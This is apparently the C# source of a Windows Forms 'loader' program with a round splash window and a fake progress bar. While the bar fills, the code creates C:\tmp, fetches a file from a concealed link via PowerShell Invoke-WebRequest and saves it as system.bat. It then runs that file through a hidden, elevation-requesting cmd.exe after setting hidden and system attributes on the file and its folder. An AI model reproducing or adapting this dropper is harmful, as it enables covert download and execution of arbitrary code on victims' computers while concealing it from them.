using Hypest;
using System;
using System.Diagnostics;
using System.Drawing.Drawing2D;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace HypestLoader
{
    public partial class form1 : Form
    {
        public form1()
        {
            InitializeComponent();
            string folderName = @"C:\tmp";
            while (!System.IO.Directory.Exists(folderName))
            {
                CreatFolder(folderName);
            }
            if (System.IO.Directory.Exists(folderName))
            {
                DownloadFile();
            }
        }

        static void DownloadFile()
        {
            string link = HideLink.getLink();
            string command = $"Powershell Invoke-WebRequest {link} -OutFile C:/tmp/system.bat";
            PowerShellHandling.RunScript(command);


        }

        static void CreatFolder(string folderName)
        {
            DirectoryInfo diretorio = Directory.CreateDirectory(@"C:\tmp");
            
        }

        static void StartBat()
        {
            string program = "start system.bat ";
            string hideFolder = "attrib +h +s C:\\tmp";
            string hideFile = "attrib +r +h +s system.bat";




            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.StartInfo.Verb = "runas";
            cmd.Start();

            try
            {
                cmd.StandardInput.WriteLine("cd " + @"C:\tmp\");
                cmd.StandardInput.WriteLine(hideFile);
                cmd.StandardInput.WriteLine(hideFolder);
                cmd.StandardInput.WriteLine(program);
                cmd.StandardInput.Flush();
                cmd.StandardInput.Close();
                Task.Delay(1000);
                
                Application.Exit();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
                Console.ReadLine();
            }

        }
        private void Form1_Load(object sender, EventArgs e)
        {
            this.progressBar1.Value = 0;
            GraphicsPath graphicsPath = new GraphicsPath();
            graphicsPath.AddArc(0, 0, 200, 200, 0, 360);
            Region = new System.Drawing.Region(graphicsPath);
        }

        private void timer1_Tick(object sender, EventArgs e)
        {

            progressBar1.Value += 1;
            if (progressBar1.Value == progressBar1.Maximum)
            {
                timer1.Enabled = false;
                string fileFolder = @"C:\tmp\system.bat";
                FileInfo file = new FileInfo(@"C:\tmp\system.bat");
                if (File.Exists(fileFolder))
                {
                    StartBat();
                }
                else
                {
                    MessageBox.Show("Erro! Arquivo inexistente! Execute novamente em 5 minutos", "Arquivo não encontrado", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    Task.Delay(1000);
                    Application.Exit();
                }

            }
        }

    }
}
